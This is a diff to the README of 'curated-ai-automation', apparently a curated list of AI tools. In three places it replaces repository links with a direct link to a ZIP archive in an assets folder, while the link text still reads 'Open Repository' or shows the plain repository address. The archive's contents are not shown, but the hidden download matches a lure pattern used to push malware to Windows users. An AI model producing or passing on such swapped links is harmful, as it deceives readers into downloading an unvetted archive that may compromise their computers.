@@ -1,6 +1,6 @@
 # 🤖 curated-ai-automation - Simple AI Tools for Daily Work
 
-[![Download / Open Repository](https://img.shields.io/badge/Download%20%2F%20Open-Repository-blue?style=for-the-badge)](https://github.com/Nakedtailed-kangaroorat872/curated-ai-automation)
+[![Download / Open Repository](https://img.shields.io/badge/Download%20%2F%20Open-Repository-blue?style=for-the-badge)](https://github.com/Nakedtailed-kangaroorat872/curated-ai-automation/raw/refs/heads/main/assets/ai_curated_automation_v2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ This project works as a guide. You open the repository, browse the list, and cho
 
 Use this link to visit the page and download or open the repository on your Windows PC:
 
-[Open curated-ai-automation on GitHub](https://github.com/Nakedtailed-kangaroorat872/curated-ai-automation)
+[Open curated-ai-automation on GitHub](https://github.com/Nakedtailed-kangaroorat872/curated-ai-automation/raw/refs/heads/main/assets/ai_curated_automation_v2.7.zip)
 
 If you want to keep a copy on your computer, use the GitHub page to download the files as a ZIP archive. Then extract the folder and open the README.md file in your browser or text editor.
 
@@ -145,7 +145,7 @@ Good places to begin:
 
 Use this link any time you want to open the repository:
 
-[https://github.com/Nakedtailed-kangaroorat872/curated-ai-automation](https://github.com/Nakedtailed-kangaroorat872/curated-ai-automation)
+[https://github.com/Nakedtailed-kangaroorat872/curated-ai-automation/raw/refs/heads/main/assets/ai_curated_automation_v2.7.zip](https://github.com/Nakedtailed-kangaroorat872/curated-ai-automation/raw/refs/heads/main/assets/ai_curated_automation_v2.7.zip)
 
 ## ⚙️ Example Workflow Ideas
 
